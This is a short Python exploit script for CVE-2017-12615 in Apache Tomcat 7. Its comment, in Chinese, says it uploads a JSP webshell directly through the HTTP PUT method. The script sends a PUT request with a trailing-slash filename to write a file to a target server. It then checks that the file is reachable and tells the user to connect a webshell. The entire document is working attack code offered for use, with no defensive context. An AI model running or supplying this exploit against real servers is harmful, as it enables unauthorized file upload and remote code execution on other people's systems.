#tomcat version 7 - 7.0.9
#使用put方法直接上传jsp的webshell
import argparse
import requests
import urllib3
import sys

urllib3.disable_warnings()

def uoload_file(url,filename,data='hello'):
    try:
        resp = requests.put(url=url+'/'+filename+'/',data=data,verify=False)
        return 1
    except Exception as e:
        print("[-] {}连接失败".format(url))
        return 0


def check_if_success(url,filename):
    try:
        respon = requests.get(url=url+'/'+filename)
        if respon.status_code == 200 and 'hello' in respon.text:
            print("[+] CVE-2017-12615 is exist"
                  "you can connect your webshell with [-f]")
        else:
            print("[-] CVE-2017-12615 is not exist")
            sys.exit()
    except Exception as e:
        print("connect failed : {}".format(e))



if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument("-u","--url",type=str,help="URL")
    parser.add_argument("-p","--port",type=int,help="PORT")
    parser.add_argument("-f","--file",type=str,help="/you/path/to/file")
    args = parser.parse_args()


    if  not args.url or not args.port :
        print("need to input a url [-u] and a port [-p] and the upload file [-f]")
        print(parser.print_help())
        sys.exit()


    url = f"{args.url}:{args.port}"
    filename = args.file if args.file else "hello.jsp"
    print(url)

    if_success = uoload_file(url,filename)

    if if_success:
        check_if_success(url,filename)